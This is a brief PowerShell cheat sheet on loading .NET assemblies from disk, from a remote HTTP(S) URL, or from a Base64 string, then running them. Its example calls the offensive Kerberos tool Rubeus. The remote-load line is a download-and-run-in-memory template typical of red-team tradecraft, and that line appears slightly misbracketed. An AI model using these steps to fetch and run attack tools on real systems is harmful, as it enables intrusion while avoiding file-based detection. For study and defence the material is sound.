# *PowerShell* Assembly Loading

## Loading

### Disk
```powershell
[System.Reflection.Assembly]::LoadFrom('<path_to_file>')
```

### HTTP(S) URL
```powershell
[System.Reflection.Assembly]::Load((Invoke-WebRequest '<http(s)>://<host>:<port>/<uri>')).Content
```

### Base64
```powershell
[System.Reflection.Assembly]::Load([Convert]::FromBase64String('<base64_string>'))
```

***

## Execution
```powershell
# [<PublicNamespace>.<PublicClass>]::Function(<arguments>
[Rubeus.Program]::Main("klist")
```